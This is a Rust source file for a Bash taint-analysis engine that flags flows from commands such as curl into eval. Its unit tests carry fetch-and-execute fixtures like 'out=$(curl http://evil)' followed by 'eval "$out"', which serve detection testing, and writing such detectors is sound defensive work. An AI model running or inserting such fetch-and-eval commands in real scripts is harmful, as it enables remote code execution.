//! Intraprocedural, flow-insensitive taint analysis for Bash / shell scripts.
//!
//! # Scope
//!
//! Mirrors the other language engines (`ruby_taint`, `php_taint`) in spirit,
//! but Bash has no rich expression grammar — taint flows through *shell
//! variables* and *command substitutions*:
//!
//! - **Per scope.** The top-level program body and each `function_definition`
//!   body are analyzed independently as a scope. (Bash command-injection rules
//!   apply to both top-level scripts and functions.)
//! - **Per file.** No cross-file analysis.
//! - **Flow-insensitive.** Statements are processed in source order.
//!
//! # Bash grammar node kinds used here (tree-sitter-bash)
//!
//! - `program` — the file root; top-level statements are direct children.
//! - `function_definition` — fields: `name` (`word`), `body`
//!   (`compound_statement`).
//! - `variable_assignment` — fields: `name` (`variable_name`), `value`
//!   (a `command_substitution`, `string`, `word`, `simple_expansion`, …).
//! - `command` — fields: `name` (`command_name`), and repeated `argument`
//!   children (`word`, `string`, `simple_expansion`, `raw_string`).
//! - `command_substitution` — `$(...)`; wraps a `command` or `pipeline`.
//!   Backtick substitution parses to the same `command_substitution` kind.
//! - `pipeline` — `cmd | cmd | …`; children are `command` nodes.
//! - `simple_expansion` — `$var`; child `variable_name`.
//! - `expansion` — `${var}` / `${var:-default}`; child `variable_name`.
//! - `string` — `"..."`; carries `simple_expansion` / `expansion` children for
//!   interpolation.
//!
//! # Matcher interpretation
//!
//! The Semgrep bridge compiles Bash command shapes to [`NodeMatcher::Call`]
//! matchers keyed by *command name*:
//!
//! - A **source** `Call { canonical }` matches a `command_substitution` whose
//!   relevant command name equals `canonical` (e.g. `$(curl ...)` → `curl`,
//!   `$(cat | jq ...)` → `jq`).
//! - A **sink** `Call { canonical }` matches a `command` whose command name
//!   equals `canonical` and one of whose arguments expands a tainted variable
//!   (e.g. `eval "$x"`, `bash -c "$x"`, `cat $x`).
//! - A **sanitizer** `Call { canonical }` matches a `command` whose command
//!   name equals `canonical`; a variable assigned from such a command (e.g.
//!   `safe=$(realpath "$x")`) is treated as clean.

use crate::rules::common::AliasTable;
use crate::rules::taint_engine::{node_text, taint_finding_for_node, TaintState};
pub use crate::rules::taint_engine::{NodeMatcher, TaintFinding, TaintSpec};
use tree_sitter::Node;

// ─── Public API ──────────────────────────────────────────────────────────────

/// Run the Bash taint engine over the top-level program scope and every
/// `function_definition` body inside `root`, returning one [`TaintFinding`]
/// per source→sink flow discovered.
pub fn analyze_tree(
    root: Node<'_>,
    source: &str,
    spec: &TaintSpec,
    _aliases: Option<&AliasTable>,
) -> Vec<TaintFinding> {
    let mut findings = Vec::new();

    // Scope 1: the top-level program body (statements not inside any function).
    let mut top_state = TaintState::default();
    walk_scope(root, source, spec, &mut top_state, &mut findings, true);

    // Scope 2..n: each function body, analyzed independently.
    collect_function_defs(root, &mut |func| {
        if let Some(body) = func.child_by_field_name("body") {
            let mut state = TaintState::default();
            walk_scope(body, source, spec, &mut state, &mut findings, false);
        }
    });

    findings
}

// ─── Scope walking ─────────────────────────────────────────────────────────

/// Walk a scope (program root or function body) in source order, propagating
/// taint through assignments and reporting sink hits.
///
/// When `skip_functions` is true (top-level scope) we do NOT descend into
/// `function_definition` nodes — they are analyzed as their own scopes.
fn walk_scope(
    node: Node<'_>,
    source: &str,
    spec: &TaintSpec,
    state: &mut TaintState,
    findings: &mut Vec<TaintFinding>,
    skip_functions: bool,
) {
    if skip_functions && node.kind() == "function_definition" {
        return;
    }

    match node.kind() {
        "variable_assignment" => handle_assignment(node, source, spec, state),
        "command" => handle_command(node, source, spec, state, findings),
        _ => {}
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        walk_scope(child, source, spec, state, findings, skip_functions);
    }
}

/// Handle `name=value`: taint the LHS variable if the RHS introduces taint or
/// references a tainted variable; clear it (sanitized) otherwise.
fn handle_assignment(node: Node<'_>, source: &str, spec: &TaintSpec, state: &mut TaintState) {
    let (Some(name_node), value) = (
        node.child_by_field_name("name"),
        node.child_by_field_name("value"),
    ) else {
        return;
    };
    if name_node.kind() != "variable_name" {
        return;
    }
    let lhs = node_text(name_node, source).to_string();

    let Some(value) = value else {
        // `name=` (empty) — clears any taint.
        state.clear(&lhs);
        return;
    };

    // A value assigned from a sanitizer command is explicitly clean.
    if value_is_sanitized(value, source, spec) {
        state.clear(&lhs);
        return;
    }

    if let Some((desc, line)) = value_taint(value, source, spec, state) {
        state.taint(lhs, desc, line);
    } else {
        state.clear(&lhs);
    }
}

/// Handle a `command` node: if its command name matches a sink and an argument
/// expands a tainted variable, emit a finding.
fn handle_command(
    node: Node<'_>,
    source: &str,
    spec: &TaintSpec,
    state: &mut TaintState,
    findings: &mut Vec<TaintFinding>,
) {
    let Some(name) = command_name(node, source) else {
        return;
    };
    let Some(sink_desc) = sink_for_command(&name, spec) else {
        return;
    };

    // Scan arguments for a tainted expansion.
    let mut cursor = node.walk();
    for (i, child) in node.children(&mut cursor).enumerate() {
        if node.field_name_for_child(i as u32) != Some("argument") {
            continue;
        }
        if let Some((src_desc, src_line)) = expansion_taint(child, source, state) {
            findings.push(taint_finding_for_node(
                node, src_desc, sink_desc, src_line, None, 1,
            ));
            return;
        }
    }
}

// ─── Taint evaluation ──────────────────────────────────────────────────────

/// Returns `(description, line)` if the assignment value `value` introduces
/// taint — either via a source command substitution or by referencing an
/// already-tainted variable.
fn value_taint(
    value: Node<'_>,
    source: &str,
    spec: &TaintSpec,
    state: &TaintState,
) -> Option<(String, usize)> {
    let line = value.start_position().row + 1;

    match value.kind() {
        // `$(...)` / backtick: a source if its command name matches.
        "command_substitution" => {
            if let Some(desc) = command_substitution_source(value, source, spec) {
                return Some((desc, line));
            }
            // Otherwise, taint propagates if any expansion inside refers to a
            // tainted variable.
            expansion_taint(value, source, state)
        }
        // `$var` referencing a tainted variable.
        "simple_expansion" | "expansion" => expansion_taint(value, source, state),
        // `"...$var..."` interpolation.
        "string" => expansion_taint(value, source, state),
        // `a$(...)` / concatenations parse as `concatenation`.
        "concatenation" => {
            let mut cursor = value.walk();
            for child in value.children(&mut cursor) {
                if let Some(r) = value_taint(child, source, spec, state) {
                    return Some(r);
                }
            }
            None
        }
        _ => None,
    }
}

/// Returns `(description, line)` if `node` (or any expansion inside it) expands
/// a tainted variable.
fn expansion_taint(node: Node<'_>, source: &str, state: &TaintState) -> Option<(String, usize)> {
    if matches!(node.kind(), "simple_expansion" | "expansion") {
        if let Some(var) = find_variable_name(node) {
            let name = node_text(var, source);
            if let Some(info) = state.info(name) {
                return Some((info.description.clone(), info.line));
            }
        }
        return None;
    }
    // Strings / concatenations / substitutions may carry nested expansions.
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(r) = expansion_taint(child, source, state) {
            return Some(r);
        }
    }
    None
}

/// If `subst` is a `command_substitution` whose relevant command name matches a
/// source `Call` matcher, return the source description.
fn command_substitution_source(subst: Node<'_>, source: &str, spec: &TaintSpec) -> Option<String> {
    let names = substitution_command_names(subst, source);
    for matcher in &spec.sources {
        if let NodeMatcher::Call {
            canonical,
            description,
        } = matcher
        {
            if names.iter().any(|n| n == canonical) {
                return Some(description.clone());
            }
        }
    }
    None
}

/// True if `value` is a `command_substitution` whose command name matches a
/// sanitizer `Call` matcher (e.g. `$(realpath "$x")`).
fn value_is_sanitized(value: Node<'_>, source: &str, spec: &TaintSpec) -> bool {
    if value.kind() != "command_substitution" {
        return false;
    }
    let names = substitution_command_names(value, source);
    spec.sanitizers.iter().any(|m| match m {
        NodeMatcher::Call { canonical, .. } => names.iter().any(|n| n == canonical),
        _ => false,
    })
}

/// Find a sink description for a command whose name is `cmd`.
fn sink_for_command(cmd: &str, spec: &TaintSpec) -> Option<String> {
    spec.sinks.iter().find_map(|m| match m {
        NodeMatcher::Call {
            canonical,
            description,
        } if canonical == cmd => Some(description.clone()),
        _ => None,
    })
}

// ─── AST helpers ────────────────────────────────────────────────────────────

/// All command names appearing inside a command substitution (`$(cmd ...)`,
/// `$(a | b | c)`). Used so a source matcher keyed by any stage of a pipeline
/// fires.
fn substitution_command_names(subst: Node<'_>, source: &str) -> Vec<String> {
    let mut names = Vec::new();
    collect_command_names(subst, source, &mut names);
    names
}

fn collect_command_names(node: Node<'_>, source: &str, out: &mut Vec<String>) {
    if node.kind() == "command" {
        if let Some(name) = command_name(node, source) {
            out.push(name);
        }
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_command_names(child, source, out);
    }
}

/// The command name of a `command` node, e.g. `eval` for `eval "$x"`.
fn command_name(node: Node<'_>, source: &str) -> Option<String> {
    let name_node = node.child_by_field_name("name")?;
    // `command_name` wraps a `word`.
    let word = if name_node.kind() == "command_name" {
        name_node.named_child(0).unwrap_or(name_node)
    } else {
        name_node
    };
    Some(node_text(word, source).to_string())
}

/// Find the `variable_name` child of a `simple_expansion` / `expansion`.
fn find_variable_name(node: Node<'_>) -> Option<Node<'_>> {
    let count = node.child_count();
    (0..count)
        .filter_map(|i| node.child(i))
        .find(|child| child.kind() == "variable_name")
}

/// Collect every `function_definition` node in the tree.
fn collect_function_defs<'tree, F>(node: Node<'tree>, visit: &mut F)
where
    F: FnMut(Node<'tree>),
{
    if node.kind() == "function_definition" {
        visit(node);
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_function_defs(child, visit);
    }
}

// ─── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::parser::parse_file;
    use crate::Language;

    fn call(canonical: &str, desc: &str) -> NodeMatcher {
        NodeMatcher::Call {
            canonical: canonical.into(),
            description: desc.into(),
        }
    }

    fn run(src: &str, spec: &TaintSpec) -> Vec<TaintFinding> {
        let tree = parse_file(src, Language::Bash).expect("parse");
        analyze_tree(tree.root_node(), src, spec, None)
    }

    fn curl_to_eval() -> TaintSpec {
        TaintSpec {
            sources: vec![call("curl", "$(curl ...)")],
            sinks: vec![call("eval", "eval")],
            sanitizers: vec![],
        }
    }

    #[test]
    fn curl_substitution_to_eval_fires() {
        let src = r#"
out=$(curl http://evil)
eval "$out"
"#;
        let f = run(src, &curl_to_eval());
        assert_eq!(f.len(), 1, "curl -> eval must fire, got {:?}", f);
        assert!(f[0].sink_description.contains("eval"));
    }

    #[test]
    fn curl_to_eval_inside_function_fires() {
        let src = r#"
g() {
  out=$(curl http://evil)
  eval "$out"
}
"#;
        let f = run(src, &curl_to_eval());
        assert_eq!(
            f.len(),
            1,
            "curl -> eval in function must fire, got {:?}",
            f
        );
    }

    #[test]
    fn pipeline_jq_source_to_eval_fires() {
        let src = r#"
data=$(cat | jq -r '.x')
eval "$data"
"#;
        let spec = TaintSpec {
            sources: vec![call("jq", "$(... | jq ...)")],
            sinks: vec![call("eval", "eval")],
            sanitizers: vec![],
        };
        let f = run(src, &spec);
        assert_eq!(f.len(), 1, "jq pipeline -> eval must fire, got {:?}", f);
    }

    #[test]
    fn clean_literal_no_finding() {
        let src = r#"
out="hello"
eval "$out"
"#;
        let f = run(src, &curl_to_eval());
        assert_eq!(f.len(), 0, "literal assignment must not fire");
    }

    #[test]
    fn sanitizer_kills_taint() {
        let src = r#"
raw=$(curl http://evil)
safe=$(realpath "$raw")
eval "$safe"
"#;
        let spec = TaintSpec {
            sources: vec![call("curl", "$(curl ...)")],
            sinks: vec![call("eval", "eval")],
            sanitizers: vec![call("realpath", "realpath")],
        };
        let f = run(src, &spec);
        assert_eq!(
            f.len(),
            0,
            "realpath sanitizer must clear taint, got {:?}",
            f
        );
    }

    #[test]
    fn untainted_variable_near_miss() {
        let src = r#"
out=$(curl http://evil)
safe="ls"
eval "$safe"
"#;
        let f = run(src, &curl_to_eval());
        assert_eq!(f.len(), 0, "eval of a clean variable must not fire");
    }
}
